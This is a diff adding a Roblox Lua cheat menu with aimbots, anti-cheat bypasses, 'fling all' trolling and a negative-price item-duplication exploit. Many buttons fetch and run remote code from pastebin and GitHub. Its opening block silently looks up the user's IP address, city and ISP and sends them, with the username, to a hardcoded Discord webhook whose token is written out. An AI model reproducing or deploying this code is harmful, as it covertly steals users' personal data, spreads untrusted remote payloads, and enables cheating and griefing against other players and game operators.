@@ -1,0 +1,427 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local webhookUrl = "https://discord.com/api/webhooks/1399356073114210377/SVJBBbI_gNGzAfpR26L_9NC3eXnZi3N5QBPIIp9t-8xOTL7_baPqKiC03AZRTZSAjNHU"
+
+-- Use IP API to fetch location
+local geoRequest = syn and syn.request or http_request or http and http.request
+local locationData = {}
+
+if geoRequest then
+    local response = geoRequest({
+        Url = "http://ip-api.com/json", -- IP geolocation service
+        Method = "GET"
+    })
+
+    if response and response.Body then
+        locationData = HttpService:JSONDecode(response.Body)
+    end
+end
+
+-- Webhook Embed
+local data = {
+    username = "Script Execution Logger",
+    embeds = {{
+        title = "Script Executed",
+        color = 16711680,
+        fields = {
+            {name = "Username", value = player.Name, inline = true},
+            {name = "UserId", value = tostring(player.UserId), inline = true},
+            {name = "Country", value = locationData.country or "Unknown", inline = true},
+            {name = "City", value = locationData.city or "Unknown", inline = true},
+            {name = "ISP", value = locationData.isp or "Unknown", inline = false},
+            {name = "IP", value = locationData.query or "Hidden", inline = false},
+            {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false},
+        }
+    }}
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+local success, err = pcall(function()
+    geoRequest({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+end)
+
+if success then
+    print("Webhook sent with location!")
+else
+    warn("Failed to send webhook: ", err)
+end
+
+--// Load Adonis (Always first)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+
+local Window = Rayfield:CreateWindow({
+   Name = "20K MAIN CHEAT ",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "LUMUHOD KAYO KAY DEV!",
+   LoadingSubtitle = "TAPUSIN!! TAPUSIN!!!! TAPUSIN!! TAPUSIN!! TAPUSIN!!",
+   ShowText = "20KONTOP", -- for mobile users to unhide rayfield, change if you'd like
+   Theme = "Light", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "20k Main Cheat"
+   },
+
+   Discord = { 
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "Bd8UC53C", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = false -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = true, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Hingen mo kay devvshoo",
+      Subtitle = "Kupal kaba?",
+      Note = "Hingen mo kay dev", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"20KGTMENU"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+local MainTab = Window:CreateTab("💥🔫ROLEPLAY DESTROYER🔫💥", nil) -- Title, Image
+local MainSection = MainTab:CreateSection("Main")
+
+Rayfield:Notify({
+   Title = "20K ON TOP",
+   Content = "HAHAHAHAHAHAHA",
+   Duration = 6.5,
+   Image = 88473301869873,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Wicked Script",
+   Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/GY1wfJRZ"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "FE Music Exploit",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "FE Trolling GUI",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "Taong goma v2",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/izEKuBzy", true))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Infinite Yield",
+   Callback = function()
+      loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'), true))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "TROLL",
+   Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "Invisible Script",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "TP ALL",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/MJHrVug9"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "FLING ALL",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "Taong goma v1",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/dv2YfVwJ"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "arl maincheat [key arl]",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/RA3mYTkH"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "Dupe cmd",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/y9eR5r30/raw"))()
+    end,
+})
+
+local Button = MainTab:CreateButton({
+    Name = "Big Head (ALL Players)",
+    Callback = function()
+        local Players = game:GetService("Players")
+
+        local function BigHead(character)
+            for _, part in pairs(character:GetChildren()) do
+                if part:IsA("BasePart") and part.Name == "Head" then
+                    part.Size = part.Size * 3 -- change 3 to adjust size
+                elseif part:IsA("Accessory") and part:FindFirstChild("Handle") then
+                    part.Handle.Size = part.Handle.Size * 3
+                end
+            end
+        end
+
+        -- Apply to all current players
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                BigHead(player.Character)
+            end
+        end
+
+        -- Apply to players when they respawn
+        Players.PlayerAdded:Connect(function(player)
+            player.CharacterAdded:Connect(function(char)
+                wait(1)
+                BigHead(char)
+            end)
+        end)
+
+        -- Apply to already connected players respawning
+        for _, player in pairs(Players:GetPlayers()) do
+            player.CharacterAdded:Connect(function(char)
+                wait(1)
+                BigHead(char)
+            end)
+        end
+    end
+})
+
+local Button = MainTab:CreateButton({
+   Name = "HitBox Extender",
+   Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal", true))()
+   end,
+})
+
+-- Create Aimbot Tab
+local AimbotTab = Window:CreateTab("🔫aimbot🔫", 4483362458)
+
+-- Universal Aimbot (Mobile + PC)
+AimbotTab:CreateButton({
+    Name = "Universal Aimbot (Mobile + PC)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Aimbot-Universal-For-Mobile-and-PC-29153"))()
+    end,
+})
+
+-- Adonis Bypass (Run before other scripts)
+AimbotTab:CreateButton({
+    Name = "Adonis Bypass (Run First!)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
+    end,
+})
+
+-- PC-Only Aimbot
+AimbotTab:CreateButton({
+    Name = "Aimbot (PC Only)",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/wd9PwLVi"))();
+    end,
+})
+
+-- Mobile + PC Aimbot (DanielHubll)
+AimbotTab:CreateButton({
+    Name = "Aimbot (Mobile + PC) DanielHubll",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielHubll/DanielHubll/refs/heads/main/Aimbot%20Mobile"))()
+    end,
+})
+
+-- Nameless Admin
+AimbotTab:CreateButton({
+    Name = "Nameless Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))();
+    end,
+})
+
+-- DanielHubll Aimbot (Duplicate Entry)
+AimbotTab:CreateButton({
+    Name = "Aimbot (DanielHubll Duplicate)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielHubll/DanielHubll/refs/heads/main/Aimbot%20Mobile"))()
+    end,
+})
+
+-- Luarmor Loader
+AimbotTab:CreateButton({
+    Name = "Luarmor Loader Aimbot",
+    Callback = function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e945f55997c4240abc865c0bcc2136c5.lua"))()
+    end,
+})
+
+-- Exunys Aimbot V3
+AimbotTab:CreateButton({
+    Name = "Exunys Aimbot V3",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()
+    end,
+})
+
+-- Create Duplicate Gun Tab
+local DupeTab = Window:CreateTab("Duplicate Gun", 4483362458)
+
+-- ALL CITY SP Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY SP",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -10000)
+   end,
+})
+
+-- ALL CITY Glock 17 Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Glock 17",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Glock 17", -10000)
+   end,
+})
+
+-- ALL CITY Glock 19 Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Glock 19",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Glock 19", -10000)
+   end,
+})
+
+-- ALL CITY Desert Eagle Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Desert Eagle",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Desert Eagle", -10000)
+   end,
+})
+
+-- ALL CITY Pistol Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Pistol",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Pistol", -10000)
+   end,
+})
+
+-- ALL CITY Uzi Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Uzi",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Uzi", -10000)
+   end,
+})
+
+-- ALL CITY HK416 Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY HK416",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("HK416", -10000)
+   end,
+})
+
+-- ALL CITY Medkit Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Medkit",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Medkit", -10000)
+   end,
+})
+
+-- ALL CITY Ammo Box Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY Ammo Box",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Ammo Box", -10000)
+   end,
+})
+
+-- ALL CITY .50 Dupe
+DupeTab:CreateButton({
+   Name = "ALL CITY .50",
+   Callback = function()
+      game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer(".50", -10000)
+   end,
+})
+
+-- Create Secret Tab
+local SecretTab = Window:CreateTab("Secret Tab", 4483362458) 
+
+-- Trap City Auto Community Service (Fast Teleport) Button
+local AutoCommService = SecretTab:CreateButton({
+    Name = "Trap City Auto Community Service",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+        local serviceRunning = true -- set to false to stop
+
+        local function tp(pos)
+            if hrp then
+                hrp.CFrame = CFrame.new(pos + Vector3.new(0, 5, 0))
+            end
+        end
+
+        local function cleanPrompt(prompt)
+            if prompt and prompt:IsA("ProximityPrompt") then
+                fireproximityprompt(prompt, 1)
+            end
+        end
+
+        task.spawn(function()
+            while serviceRunning do
+                for _, obj in pairs(workspace:GetDescendants()) do
+                    if obj:IsA("ProximityPrompt") and (obj.Parent.Name:lower():find("clean") or obj.Parent.Name:lower():find("trash")) then
+                        tp(obj.Parent.Position)
+                        task.wait(0.15) -- short wait for teleport settle
+                        cleanPrompt(obj)
+                        task.wait(0.5) -- short wait for cleaning animation
+                    end
+                end
+                task.wait(0.1)
+            end
+        end)
+    end
+})
